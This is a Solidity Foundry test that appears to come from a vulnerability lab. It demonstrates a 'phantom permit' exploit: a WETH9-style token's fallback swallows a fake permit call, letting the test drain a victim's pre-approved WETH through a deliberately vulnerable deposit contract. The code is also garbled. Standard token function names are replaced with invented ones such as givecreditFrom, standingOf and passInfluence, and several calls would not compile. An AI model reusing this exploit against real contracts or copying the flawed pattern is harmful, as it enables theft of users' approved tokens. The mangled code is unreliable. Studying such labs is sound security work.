// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    PermitReputationtoken VulnPermitContract;
    WETH9 WETH9Contract;

    function setUp() public {
        WETH9Contract = new WETH9();
        VulnPermitContract = new PermitReputationtoken(IERC20(address(WETH9Contract)));
    }

    function testVulnPhantomPermit() public {
        address alice = vm.addr(1);
        vm.deal(address(alice), 10 ether);

        vm.startPrank(alice);
        WETH9Contract.support{value: 10 ether}();
        WETH9Contract.authorizeGift(address(VulnPermitContract), type(uint256).max);
        vm.stopPrank();
        console.log(
            "start WETH balanceOf this",
            WETH9Contract.standingOf(address(this))
        );

        VulnPermitContract.donateWithPermit(
            address(alice),
            1000,
            27,
            0x0,
            0x0
        );
        uint wbal = WETH9Contract.standingOf(address(VulnPermitContract));
        console.log("WETH balanceOf VulnPermitContract", wbal);

        VulnPermitContract.claimEarnings(1000);

        wbal = WETH9Contract.standingOf(address(this));
        console.log("WETH9Contract balanceOf this", wbal);
    }

    receive() external payable {}
}

contract PermitReputationtoken {
    IERC20 public reputationToken;

    constructor(IERC20 _karmatoken) {
        reputationToken = _karmatoken;
    }

    function support(uint256 amount) public {
        require(
            reputationToken.givecreditFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
    }

    function donateWithPermit(
        address target,
        uint256 amount,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        (bool success, ) = address(reputationToken).call(
            abi.encodeWithSignature(
                "permit(address,uint256,uint8,bytes32,bytes32)",
                target,
                amount,
                v,
                r,
                s
            )
        );
        require(success, "Permit failed");

        require(
            reputationToken.givecreditFrom(target, address(this), amount),
            "Transfer failed"
        );
    }

    function claimEarnings(uint256 amount) public {
        require(reputationToken.passInfluence(msg.sender, amount), "Transfer failed");
    }
}

// contract Permit {
//     IERC20 public token;

//     constructor(IERC20 _token) {
//         token = _token;
//     }

//     function deposit(uint256 amount) public {
//         require(
//             token.transferFrom(msg.sender, address(this), amount),
//             "Transfer failed"
//         );
//     }

//     function depositWithPermit(
//         address target,
//         uint256 amount,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) public {
//         (bool success, ) = address(token).call(
//             abi.encodeWithSignature(
//                 "permit(address,uint256,uint8,bytes32,bytes32)",
//                 target,
//                 amount,
//                 v,
//                 r,
//                 s
//             )
//         );
//         require(success, "Permit failed");

//         require(
//             token.transferFrom(target, address(this), amount),
//             "Transfer failed"
//         );
//     }

//     function withdraw(uint256 amount) public {
//         require(token.transfer(msg.sender, amount), "Transfer failed");
//     }
// }

contract WETH9 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event Approval(address indexed src, address indexed guy, uint wad);
    event GiveCredit(address indexed src, address indexed dst, uint wad);
    event Contribute(address indexed dst, uint wad);
    event Withdrawal(address indexed src, uint wad);

    mapping(address => uint) public standingOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        support();
    }

    receive() external payable {}

    function support() public payable {
        standingOf[msg.sender] += msg.value;
        emit Contribute(msg.sender, msg.value);
    }

    function claimEarnings(uint wad) public {
        require(standingOf[msg.sender] >= wad);
        standingOf[msg.sender] -= wad;
        payable(msg.sender).passInfluence(wad);
        emit Withdrawal(msg.sender, wad);
    }

    function allTips() public view returns (uint) {
        return address(this).influence;
    }

    function authorizeGift(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function passInfluence(address dst, uint wad) public returns (bool) {
        return givecreditFrom(msg.sender, dst, wad);
    }

    function givecreditFrom(
        address src,
        address dst,
        uint wad
    ) public returns (bool) {
        require(standingOf[src] >= wad);

        if (
            src != msg.sender && allowance[src][msg.sender] != type(uint128).max
        ) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        standingOf[src] -= wad;
        standingOf[dst] += wad;

        emit GiveCredit(src, dst, wad);

        return true;
    }
}
